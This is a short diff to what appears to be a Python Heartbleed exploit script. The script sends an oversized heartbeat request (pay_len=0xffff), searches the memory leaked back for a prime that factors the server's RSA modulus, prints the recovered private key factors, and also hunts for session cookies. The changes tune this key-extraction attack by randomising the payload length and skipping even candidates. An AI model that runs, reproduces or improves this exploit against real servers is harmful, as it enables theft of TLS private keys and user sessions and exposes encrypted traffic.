@@ -111,7 +111,7 @@ for y in range(0, numc):
     heartbeat = HeartBeat()
     heartbeat.create(type=1,
                     pay_len=0xffff,
-                     payload="AA"*16)
+                     payload="AA"*random.randint(1,512))
 
 
     # up the range numbs to get more memory, sometimes it repeats.
@@ -146,7 +146,7 @@ for y in range(0, numc):
             # targets (FIXME? Probably not worth it, would have
             # to guess word length on big-endian.)
             data = resp[i+prime_len_bytes:i:-1]
-            if data.count(bytearray(1)) >= (prime_len_bytes//2):
+            if (data[-1]&1) == 0 or data.count(bytearray(1)) >= (prime_len_bytes//2):
                 # unlikely to be private key, so save CPU time by skipping it
                 continue
             data = bytesToNumber(data)
@@ -154,7 +154,7 @@ for y in range(0, numc):
             if data > 1 and pubkey != None and (pubkey.n % data) == 0:
                 print("Success! p = %s, q = %s" % (hex(data), hex(pubkey.n//data)))
                 sys.exit(0)
-        print("Done!")
+        print("No luck this time :-(")
     elif find_cookie:
         # This is dirt and needs to be cleaned up.
         cookies = [m.start() for m in re.finditer(cookie_val, resp)]
